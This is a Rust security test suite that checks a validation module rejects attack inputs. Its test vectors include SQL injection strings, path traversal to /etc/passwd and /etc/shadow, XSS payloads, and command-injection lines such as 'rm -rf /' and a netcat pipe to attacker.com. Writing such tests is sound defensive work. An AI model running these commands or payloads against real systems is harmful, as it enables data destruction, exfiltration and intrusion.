//! Security-focused tests for input validation
//!
//! Tests protection against common attack vectors including:
//! - SQL injection
//! - Path traversal
//! - Command injection
//! - XSS attempts
//! - Buffer overflow attempts
//! - DoS attacks

use saorsa_core::validation::*;
use std::path::Path;

#[test]
fn test_sql_injection_protection() {
    let ctx = ValidationContext::default();

    let sql_injections = vec![
        "1; DROP TABLE users;",
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT * FROM passwords--",
        "); DELETE FROM users WHERE 1=1--",
        "' OR 1=1--",
        "1'; EXEC sp_executesql--",
    ];

    for injection in sql_injections {
        let req = ApiRequest {
            method: "GET".to_string(),
            path: "/api/users".to_string(),
            params: [("id".to_string(), injection.to_string())].into(),
        };

        assert!(
            req.validate(&ctx).is_err(),
            "SQL injection not caught: {}",
            injection
        );
    }
}

#[test]
fn test_path_traversal_protection() {
    let path_traversal_attempts = vec![
        "../etc/passwd",
        "../../etc/shadow",
        "../../../boot.ini",
        "..\\windows\\system32",
        "data/../../../etc/hosts",
        "uploads/../../config",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL encoded
        "....//....//etc/passwd",
        "..;/etc/passwd",
    ];

    for path in path_traversal_attempts {
        assert!(
            validate_file_path(Path::new(path)).is_err(),
            "Path traversal not caught: {}",
            path
        );
    }
}

#[test]
fn test_command_injection_protection() {
    // While we don't execute commands, ensure special characters are caught
    let command_injections = vec![
        "file; rm -rf /",
        "data | nc attacker.com 1234",
        "$(whoami)",
        "`id`",
        "file && cat /etc/passwd",
        "file\ncat /etc/passwd",
        "file\0cat /etc/passwd",
    ];

    for cmd in command_injections {
        assert!(
            validate_file_path(Path::new(cmd)).is_err(),
            "Command injection characters not caught: {}",
            cmd
        );
    }
}

#[test]
fn test_xss_prevention() {
    let ctx = ValidationContext::default();

    let xss_attempts = vec![
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert()'></iframe>",
        "';alert('XSS');//",
    ];

    for xss in xss_attempts {
        // Test in API parameters
        let req = ApiRequest {
            method: "POST".to_string(),
            path: "/api/comment".to_string(),
            params: [("content".to_string(), xss.to_string())].into(),
        };

        // While not explicitly checking for XSS, suspicious content should be caught
        let _result = req.validate(&ctx);

        // Test sanitization removes dangerous content
        let sanitized = sanitize_string(xss, 100);
        assert!(!sanitized.contains('<'));
        assert!(!sanitized.contains('>'));
        assert!(!sanitized.contains("script"));
    }
}

#[test]
fn test_buffer_overflow_protection() {
    let ctx = ValidationContext::default();

    // Test various size limits
    let large_peer_id = "x".repeat(1000);
    assert!(validate_peer_id(&large_peer_id).is_err());

    // Test message size limits
    let huge_size = usize::MAX;
    assert!(validate_message_size(huge_size, ctx.max_message_size).is_err());

    // Test path length limits
    let long_path = "x".repeat(5000);
    assert!(validate_file_path(Path::new(&long_path)).is_err());

    // Test DHT key/value limits
    let huge_key = vec![0u8; 10 * 1024 * 1024]; // 10MB
    assert!(validate_dht_key(&huge_key, &ctx).is_err());

    let huge_value = vec![0u8; 100 * 1024 * 1024]; // 100MB
    assert!(validate_dht_value(&huge_value, &ctx).is_err());
}

#[test]
fn test_dos_protection_rate_limiting() {
    use std::sync::Arc;
    use std::time::Duration;

    let config = RateLimitConfig {
        window: Duration::from_secs(1),
        max_requests: 10,
        burst_size: 5,
        adaptive: true,
        ..Default::default()
    };

    let limiter = Arc::new(RateLimiter::new(config));
    let attacker_ip: std::net::IpAddr = "10.0.0.1".parse().unwrap();

    // Simulate rapid requests from single IP
    let mut allowed = 0;
    let mut blocked = 0;

    for _ in 0..100 {
        match limiter.check_ip(&attacker_ip) {
            Ok(_) => allowed += 1,
            Err(_) => blocked += 1,
        }
    }

    // Should block most requests
    assert!(
        blocked > 80,
        "Rate limiting not effective: {} blocked out of 100",
        blocked
    );
    assert!(allowed <= 20, "Too many requests allowed: {}", allowed);
}

#[test]
fn test_null_byte_injection() -> Result<()> {
    // Null bytes can be used to bypass validation
    let null_byte_attempts = vec![
        "file.txt\0.exe",
        "data\0../../etc/passwd",
        "normal\0<script>",
    ];

    for attempt in null_byte_attempts {
        assert!(
            validate_file_path(Path::new(attempt)).is_err(),
            "Null byte not caught: {:?}",
            attempt
        );
    }
    Ok(())
}

#[test]
fn test_unicode_normalization_attacks() {
    // Unicode can be used to bypass filters
    let unicode_attempts = vec![
        "ﾠscript",                // Full-width space
        "..／etc／passwd",       // Full-width slash
        "％2e％2e／etc／passwd", // Full-width percent
    ];

    for attempt in unicode_attempts {
        let sanitized = sanitize_string(attempt, 100);
        // Should remove or normalize suspicious Unicode
        assert_ne!(sanitized, attempt);
    }
}

#[test]
fn test_timing_attack_resistance() -> Result<()> {
    use std::time::Instant;

    // Ensure validation timing doesn't leak information
    let valid_peer = "valid_peer_id_123";
    let invalid_short = "short";
    let _invalid_long = "x".repeat(100);

    let mut valid_times = Vec::new();
    let mut invalid_times = Vec::new();

    // Measure validation times
    for _ in 0..100 {
        let start = Instant::now();
        let _ = validate_peer_id(valid_peer);
        valid_times.push(start.elapsed());

        let start = Instant::now();
        let _ = validate_peer_id(invalid_short);
        invalid_times.push(start.elapsed());
    }

    // Calculate average times
    let valid_avg: u128 =
        valid_times.iter().map(|d| d.as_nanos()).sum::<u128>() / valid_times.len() as u128;
    let invalid_avg: u128 =
        invalid_times.iter().map(|d| d.as_nanos()).sum::<u128>() / invalid_times.len() as u128;

    // Times should be similar (constant-time validation)
    let diff = if valid_avg > invalid_avg {
        valid_avg - invalid_avg
    } else {
        invalid_avg - valid_avg
    };

    // Allow up to 50% difference
    let max_diff = valid_avg.max(invalid_avg) / 2;
    assert!(
        diff < max_diff,
        "Timing attack possible: valid={:?}ns, invalid={:?}ns, diff={:?}ns",
        valid_avg,
        invalid_avg,
        diff
    );
    Ok(())
}

#[test]
fn test_regex_dos_protection() -> Result<()> {
    // Test that regex patterns don't cause ReDoS
    use std::time::Instant;

    // Patterns that could cause exponential backtracking
    let malicious_inputs = vec![
        "a".repeat(100) + "!",
        "x".repeat(1000),
        "-".repeat(500) + "_" + &"-".repeat(500),
    ];

    for input in malicious_inputs {
        let start = Instant::now();
        let _ = validate_peer_id(&input);
        let elapsed = start.elapsed();

        // Should complete quickly even with long input
        assert!(
            elapsed.as_millis() < 100,
            "Regex took too long: {:?}ms for input length {}",
            elapsed.as_millis(),
            input.len()
        );
    }
    Ok(())
}

#[test]
fn test_memory_exhaustion_protection() {
    let ctx = ValidationContext::default();

    // Try to exhaust memory with large allocations
    let memory_attacks = vec![
        // Large message
        NetworkMessage {
            peer_id: "valid_peer_id_123".to_string(),
            payload: vec![0u8; 100 * 1024 * 1024], // 100MB
            timestamp: 0,
        },
        // Many small allocations
        NetworkMessage {
            peer_id: "x".repeat(64),
            payload: vec![0u8; ctx.max_message_size + 1],
            timestamp: 0,
        },
    ];

    for attack in memory_attacks {
        assert!(
            attack.validate(&ctx).is_err(),
            "Memory exhaustion attempt not caught"
        );
    }
}

#[test]
fn test_integer_overflow_protection() {
    // Test for integer overflow in size calculations
    let ctx = ValidationContext::default();

    // These should not cause panics or overflows
    let _ = validate_message_size(usize::MAX, ctx.max_message_size);
    let _ = validate_message_size(usize::MAX - 1, usize::MAX);

    // Config validation with extreme values
    let _ = validate_config_value::<u64>(&u64::MAX.to_string(), Some(0), Some(u64::MAX));
}
